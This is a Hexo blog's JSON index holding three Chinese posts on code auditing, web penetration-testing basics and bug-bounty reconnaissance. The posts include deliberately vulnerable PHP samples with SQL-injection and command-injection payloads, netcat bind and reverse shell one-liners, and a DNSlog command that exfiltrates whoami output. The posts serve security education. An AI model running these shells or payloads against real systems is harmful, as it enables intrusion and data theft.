{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"https://ink-scholar.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-11-24T07:16:07.600Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"/404.html","permalink":"https://ink-scholar.github.io/404.html","excerpt":"","text":""},{"title":"书单","date":"2023-11-24T07:16:07.619Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"books/index.html","permalink":"https://ink-scholar.github.io/books/index.html","excerpt":"","text":""},{"title":"关于","date":"2023-11-24T07:16:07.610Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"about/index.html","permalink":"https://ink-scholar.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"分类","date":"2023-11-24T07:40:53.199Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"categories/index.html","permalink":"https://ink-scholar.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-11-24T07:17:50.043Z","updated":"2022-03-21T07:18:46.000Z","comments":true,"path":"links/index.html","permalink":"https://ink-scholar.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-11-24T07:16:07.646Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"repository/index.html","permalink":"https://ink-scholar.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-11-24T07:18:08.372Z","updated":"2022-03-21T07:18:46.000Z","comments":false,"path":"tags/index.html","permalink":"https://ink-scholar.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"代码审计概述","slug":"代码审计概述","date":"2023-12-17T12:43:25.221Z","updated":"2023-12-18T16:55:32.866Z","comments":true,"path":"2023/12/17/代码审计概述/","permalink":"https://ink-scholar.github.io/2023/12/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/","excerpt":"","text":"先来一张图 术：漏洞利用的工具使用，什么代码、什么框架用什么工具；遇到什么站拿什么打（骚操作、技巧） 用：漏洞的挖掘思维，代码的审计思维，安全开发的思维（某一个门类的共性） 体：安全核心，安全思维，漏洞产生的根本原因，漏洞的抽象共性（整个安全的底层基础） 即 一线技巧 –》 思考者 –》 安全本质 个人觉得说的很好，深有感触 安全的本质信任问题！ 一切的安全方案设计的基础，都是建立在信任关系上的。我们必须相信一些东西，必须要有一些最基本的假设，安全方案才能得以建立。反之，如果我们否定一切，安全方案就会变成无源之水、无本之木，无法设计，也无法完成。 是否该信任普通用户的输入？（前台漏洞） 是否该信任管理员用户的输入？（后台漏洞） 是否该信任升级包、离线升级、在线升级、自动化升级？（供应链攻击） 不信任任何输入？（信任了输入的检测逻辑） 安全方案模型所有的安全模型，都可以简化成一种最简易的模型：输入&#x3D;&#x3D;》检测是否有安全风险&#x3D;&#x3D;》输出 为什么是输入？？所有的输入都是恶意的：入侵检测理论的名言 我们能掌控的只有输入：我们挖掘漏洞最好的入口点，也是也只能从输入去入手 在整个代码审计的过程中，一定要紧紧抓住输入，结合不同语言的特点，跟踪传播链条是否有可疑点 程序希望用户输入什么控制流与数据流看两段代码 1234567&lt;html&gt; &lt;body&gt;Hello my name is :&lt;?phpecho $_GET[&quot;name&quot;];?&gt; &lt;/body&gt;&lt;/html&gt; 1234567&lt;html&gt;&lt;script&gt;console.log(Hello my name is :&quot; + &quot;&lt;?phpecho $_GET[&quot;name&quot;];?&gt;&lt;/script&gt;&lt;/html&gt; 将代码分成两部分，一部分是控制代码走向的控制流代码，另一部分是用来被展示、被存储、被流转的数据流代码（包括输入数据、程序员本来就硬编码的数据） 程序员希望用户输入的一定数据流而不是控制流 一旦我们 输入的数据 能够以某种方式侵入到控制流时，漏洞就产生了 如下 sql注入12345&lt;?php$db = init_db();$username = $_GET[&#x27;username&#x27;];$db-&gt;query(&quot;select * from table where username = &#x27;$username&#x27;&quot;); ?&gt; 我们看一下输入到流转： 输入 –》 php字符串变量 –》 sql语句 –》 数据库 在数据库层面，控制流是sql语句，原本这段代码的本意是： 123456action：selectobject：tablesubject：*condition： key：username value：$username 代码保证用户的输入只能影响结构中的value位置，如果不能保障，就会出现漏洞 比如我们输入：admin’ and 1&#x3D;1# 123456789action：selectobject：tablesubject：*condition： expression：and key1：username value1：$username key2: 1 value2: 1 我们在代码层（PHP）的输入，导致了数据库（mysql）层的数据流入侵到了控制流 SSTI服务端模版注入 Twig是php的一套模板渲染的组件，但是不规范的渲染参数输入方式，可能导致模板注入 1234567&lt;?php require_once dirname(__FILE__).&#x27;\\twig\\lib\\Twig\\Autoloader.php&#x27;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); echo $output;?&gt; 以上这段代码是正确的，没有产生漏洞的，我们来看一下输入流转： 输入–》php字符串变量$_GET[“name”]–》Twig模板渲染–》发现变量–》找到变量name的绑定–》解析字符串–》渲染展示 我们再看一下错误的写法 1234567&lt;?php require_once dirname(__FILE__).&#x27;\\twig\\lib\\Twig\\Autoloader.php&#x27;; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;); echo $output;?&gt; 再看一下输入流转： 输入–》php字符串变量$_GET[“name”]–》拼接字符串”Hello {$_GET[‘name’]}”作为新变量–》Twig模板渲染–》渲染展示 我们在代码层（php）的输入，导致了Twig模板层的数据流入侵到了控制流 命令执行1234&lt;?php$domain = $_GET[&quot;domain&quot;];echo system(&#x27;tracert &quot;&#x27;.$domain.&#x27;&quot;&#x27;)?&gt; 这个代码其实就是tracert命令 程序原意是在 bash程序 中 1234execute： process: exe: tracert --&gt; /bin/tracert arg: $domain 此时，程序必须保证用户的输入只能影响到arg位置，如果不能保障，则会产生漏洞 比如输入： 1baidu.com&quot;;whoami;echo &quot;fuck qax 此时代码里的拼接为 1tracert &quot;baidu.com&quot;;whoami;echo &quot;fuck qax&#x27; 此时代码执行的逻辑为 1234567891011execute： process1: exe: tracert arg: &quot;baidu.com&quot; or--&gt; process2: exe: whoami arg: - or--&gt; exe: echo arg: &quot;fuck qax&quot; 我们在代码层（php）的输入，导致了bash程序层的数据流入侵到了控制流 业务流程问题很多逻辑漏洞、越权漏洞，往往来源于此，也是现代mvc结构出现比较多的问题。（现代mvc结构一般不会出现sql注入[预编译解决]、xss[前端框架解决]、webshell上传[java，python这种网站或者oss存储]） 过度信任用户输入业务功能：输出当前用户信息 123456&lt;?php$user_id = int($_GET[&#x27;user_id&#x27;]);$db = init_db();$data = $db-&gt;query(&quot;select * from user where user_id = $user_id&quot;);echo parse_user_profile($data);?&gt; 这是一个典型的越权读取模型，虽然没有sql注入问题，但是在业务逻辑上的校验有漏洞，信任了用户输入的user_id 不信任用户输入–即信任检测逻辑123456789101112131415161718192021222324252627282930313233//login.php&lt;?phpsession_start();header(&quot;content-type: text/html; charset=utf-8&quot;);$password = &quot;test&quot;;$_SESSION[&#x27;is_login&#x27;J = 0;if ($_GET[&#x27;password&#x27;] == $password)&#123; $_SESSION[&#x27;is_login&#x27;] = 1; $_SESSION[&#x27;user_id&#x27;] = $_GET[&quot;user_id&quot;]; // 假定管理员user_id=。 header(&quot;location: /user.php?is_login=l&quot;); exit();&#125;else&#123; echo &quot;密码错误&quot;； exit();&#125;?&gt;// http://192.168.215.129/login.php?password=test&amp;user_id=123//user.php&lt;?phpsession_start();header(&quot;content-type: text/html; charset=utf-8&quot;);if ($_SESSION[&#x27;is_login&#x27;] == $_GET[&#x27;is_login&#x27;])&#123; echo &quot;你登录了&quot;; if ($_SESSION[&#x27;user_id&#x27;] == 0)&#123; echo &quot;你是管理员&quot;; &#125;else&#123; echo &quot;你不是管理员&quot;; &#125;&#125;else&#123; echo &quot;没登陆&quot;;&#125;?&gt; 这是一个经典的逻辑绕过漏洞，在整个流程中，开发者完全没有信任用户的输入。 对密码进行了校验，校验通过才存session，并且用户id也是存储于session中的，没法通过cookie伪造绕过鉴权。 不信任任何输入–》对输入进行检测（实际上就是把信任关系绑定到了对输入检测逻辑上，那么一旦输入检测逻辑出现问题，信任关系被打破，就出现了漏洞） php是弱类型语言，在php中，NULL &#x3D;&#x3D; false &#x3D;&#x3D; 0 &#x3D;&#x3D; “” 所以上面的代码中，我们什么都不输入，就可以绕过检测 用体-用-术看待问题盗张图 切记！！！紧紧抓入输入，即能否让数据流逃逸到控制流，你的输入能否在业务逻辑上产生问题，如何根据污点分析快速筛选出有问题的业务","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"渗透测试--基础入门","slug":"渗透测试--基础入门","date":"2023-12-14T14:33:04.392Z","updated":"2024-01-02T15:19:58.320Z","comments":true,"path":"2023/12/14/渗透测试--基础入门/","permalink":"https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/","excerpt":"","text":"此篇主要写一点和web相关的基础知识，随便写写，不成系统 Web环境常规知识web应用系统常见的三种搭建方式：子域名、端口、目录三种方式 其他方式还有类似于博客园这种分配站的形式 网站数据库站库分离，现在常见的类型是云数据库RDS，安全性更高 对象存储OSS：只存储不解析，修复上传安全，但是存在Accesskey隐患 开源源码–源码可见&#x2F;源码不可见（加密，语言特性） 加密一般网上有对应的，比如asp、php加解密网站 语言特性比如java代码，从服务器上拖下来是一些class文件，此时需要反编译 路由访问：url和文件目录对应不上很正常，要根据配置路由决定 前后端分离：前端JS框架，API传输数据；前端页面大部分不存在漏洞，而后端管理大部分不在同域名，因此获得权限有可能不影响后端 类似于宝塔的打包类集成化环境，文件管理会锁定目录，命令无法执行，和权限有关 Docker容器：虚拟化技术， 独立磁盘空间，非真实的物理环境；因此衍生出docker逃逸，以后会写 WAF: CDN：内容分发服务，提高访问速度，可隐藏真实源IP 反向代理： 正向代理为客户端服务，客户端主动建立代理访问目标（不代理不可达） 反向代理为服务端服务，服务端主动转发数据给可访问地址（不主动不可达） 因此你的访问目标只是一个代理，而非真实的应用服务器 正向代理和反向代理都是解决访问不可达问题，由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实的应用没有关系 负载均衡：分摊到多个操作单元上进行执行，共同完成工作任务；有多个服务器加载服务，测试过程中存在多个目标情况 在宝塔中可以如下进行配置： 12345678910# 定义负载设置upstream fzjh&#123; server 1.1.1.1:80 weight=2; server 2.2.2.2:80 weight=1;&#125;# 定义访问路径和策略location / &#123; proxy_pass http://fzjh/;&#125; APP&#x2F;小程序应用开发架构： 1、原生开发 安卓一般用java开发，也有kotlin语言开发，效率和功能是最好的，难度也是最大的 2、H5开发 使用HBuilder X，一般就是H5➕Vue，会存在API和JS框架安全问题 3、使用flutter开发 谷歌推出的一款UI框架，使用dart语言开发，支持跨平台，weight渲染直接操作硬件层，但是技术比较新，生态还不完善 4、常规web开发 就是开发一个网站，然后加入app的壳。web app 一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所有反应速度慢，内容加载过多容易卡死。 Web常规命令基础推荐个网站：https://forum.ywhack.com/bountytips.php 在里面填一些基本信息会将命令显示出来 文件上传下载： Linux：wget，curl，python，ruby，perl，java等 Windows：PowerShell，Certutil，Bitsadmin，msiexec，mshta，rundll32等 反弹shell： 正向连接：即自己主动找别人，如Linux控制windows正向连接 在windows上绑定cmd到本地5566端口 1nc -e cmd -lvvp 5566 然后Linux主动连接windows的5566端口 1ncat ip 5566 同理，windows控制Linux的话，在Linux上执行 1ncat -e /bin/sh -lvvp 5566 在windows上执行 1nc ip 5566 反向连接：即别人主动来找我，我自己监听，如windows等待Linux反向连接 在Windows上执行 1nc -lvvp 5566 在Linux上执行 1ncat -e /bin/sh windows的ip windows本地正在监听的端口 管道符： Windows：| &amp; || &amp;&amp; Linux：; | || &amp; &amp;&amp; &#96;&#96; 用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行 管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推，显示后面语句的执行结果 &amp;放在启动参数后面表示设置此进程为后台进程 只有在 &amp;&amp; 左边的命令返回真，&amp;&amp; 右边的命令才会被执行 只有在 || 左边的命令返回假，|| 右边的命令才会被执行，只要有一个命令返回真，后面的命令就不会被执行，即一直到返回真的地方停止执行 数据回显：除了上面的反弹shell方法，还可以外带数据查询，比如使用dnslog平台，ping `whoami`.xxx.dnslog.cn，如果有命令执行那就会看到whoami的执行结果。当然 ``仅限于Linux，如果遇到Windows的话，可以使用powershell 1powershell $a=whoami;$a=$a.replace(&#x27;\\&#x27;,&#x27;rce&#x27;);$b=&#x27;.xxxxx.dnslog.cn&#x27;;$c=$a+$b;ping $c 为什么在windows下这么复杂？因为windows下cmd无法直接使用管道符去解析whoami，所有要使用powershell变量赋值，把whoami执行结果给到变量，但是ping的结果中带有 \\ ，所有加个replace去替换 抓包基础HTTP&#x2F;HTTPS协议charles（茶杯）、Fiddler、burp，怎么安装使用网上一大堆，这里不多赘述。 抓微信小程序：可以使用charles抓包，然后转给burp分析；还可以使用proxifier 个人推荐使用proxifier，打开后在代理服务器中选择https，地址与端口和burp的保持一致，然后在代理规则中的应用程序输入wechat*.exe即可，这是在Windows上的方法，如果用mac的话，应用程序那里可以点 + 号 然后在Applications那里，搜索应用，如微信小程序 这个Mini Program 就是小程序的执行程序 PC应用：和抓微信小程序一样，也是用 proxifier➕burp 即可 其他协议推荐工具：科来（没有mac版本，适合新手）、Wireshark 模拟器的一些游戏抓取可以用一个封包监听工具，下载地址和使用说明可以去b站看看 https://www.bilibili.com/video/BV19a411s7pf/?pop_share=1&amp;vd_source=f0e85cdc73190cf042eeba2be6dba3cb 编码算法加密基础加密&amp;编码单向散列加密代表有 MD5 ，常见的还有 SHA ， MAC ， CRC 优点：方便存储，损耗低，加密对性能的损耗微乎其微 缺点：存在暴力破解的可能性，因此最好通过 加盐 的方式提高安全性，此外可能存在散列冲突 MD5密文特点：由数字0-9和字母a-z组成，固定位数16位或32位 解密需求：知道密文即可，对于复杂明文很难碰撞出来 base64编码 一般情况下密文尾部回忆两个等号&#x3D;&#x3D;，明文很少的时候则没有 明文越长密文越长，密文中一般不会出现 &#x2F; 区分大小写 对称加密代表有 AES，常见的还有 DES ， RC4 优点：算法公开，计算量小，加密速度快，加密效率高 缺点：发送方和接收方必须商定好密钥，密钥管理可能存在问题 AES、DES密文特点：和base64基本类似，但密文中一般会有 &#x2F; 和 + 解密需求：密文、模式、加密key，偏移量（ECB模式默认没有偏移量），条件满足方可解密 非对称加密代表有 RSA ，常见的还有 RSA2 ， PKCS 优点：比对称加密安全性更好，加解密需要不同的密钥，即 使用公钥加密就要使用私钥解密，使用私钥加密就要公钥解密 缺点：加解密花费时间长，速度慢，只适合对少量数据进行加密 密文特点：和AES相似，但是长度较长，同一明文每次加密他的密文都会变动 解密需求：密文、公钥或私钥 数据包基础请求 响应 状态码 在请求目录时，比如xxxxx&#x2F;sys&#x2F;admin&#x2F;为200 OK，而xxxxx&#x2F;sys&#x2F;为403，为什么？ 原因是在访问xxxxx&#x2F;sys&#x2F;admin&#x2F;时，此目录下面有类似于index的指引页面，因此可以返回200；而xxxxx&#x2F;sys&#x2F;目录下没有类似于index的指引 页面，因此返回403，但是此目录是存在的，所以扫到目录显示403表示目录是存在的","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"基础","slug":"基础","permalink":"https://ink-scholar.github.io/tags/%E5%9F%BA%E7%A1%80/"},{"name":"WEB","slug":"WEB","permalink":"https://ink-scholar.github.io/tags/WEB/"}]},{"title":"SRC通用讲解","slug":"SRC通用讲解","date":"2023-11-24T13:12:12.413Z","updated":"2023-12-06T15:42:58.179Z","comments":true,"path":"2023/11/24/SRC通用讲解/","permalink":"https://ink-scholar.github.io/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/","excerpt":"","text":"此篇主要讲解src挖掘过程中的通用技巧，已方法为主，帮助快速刷src，赚点赏金 信息收集网络空间搜索精准搜索域名搜索Fofa：domain&#x3D;“baidu.com” Hunter：domain.suffix&#x3D;”Baidu.com” Google：site:baidu.com 域名解析微步：https://x.threatbook.com/ 360：https://ti.360.cn/ 旁站查询：https://webscan.cc （对于IP站更好一点） 子域名工具水泽：https://github.com/0x727/ShuiZe_0x727 灯塔魔改版：https://github.com/ki9mu/ARL-plus-docker Nemo：https://github.com/hanc00l/nemo_go 推荐灯塔魔改版 企业查询小蓝本、企查查、爱企查、微信小程序、公众号 模糊搜索通用方法Github关键字搜索 网络空间搜索引擎body，title，ico特征，js特征搜索 通用系统搜索 CNVD通用搜索 EDU通用搜索 短视频信息搜索抖音快手B站等，直接搜索内容，如：腾讯后台登录教程，可以看到一些url甚至是账号密码 语雀搜索 语雀搜索是需要登录的，登录后可以进入页面 https://www.yuque.com/dashboard ，左上角会存在搜索 当然登陆客户端也有 弱口令条件竞争（并发）越权CORS➕XSS未授权SSRF➕RCE逻辑漏洞云安全常见框架漏洞","categories":[{"name":"SRC","slug":"SRC","permalink":"https://ink-scholar.github.io/categories/SRC/"}],"tags":[{"name":"src","slug":"src","permalink":"https://ink-scholar.github.io/tags/src/"}]}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"SRC","slug":"SRC","permalink":"https://ink-scholar.github.io/categories/SRC/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://ink-scholar.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"基础","slug":"基础","permalink":"https://ink-scholar.github.io/tags/%E5%9F%BA%E7%A1%80/"},{"name":"WEB","slug":"WEB","permalink":"https://ink-scholar.github.io/tags/WEB/"},{"name":"src","slug":"src","permalink":"https://ink-scholar.github.io/tags/src/"}]}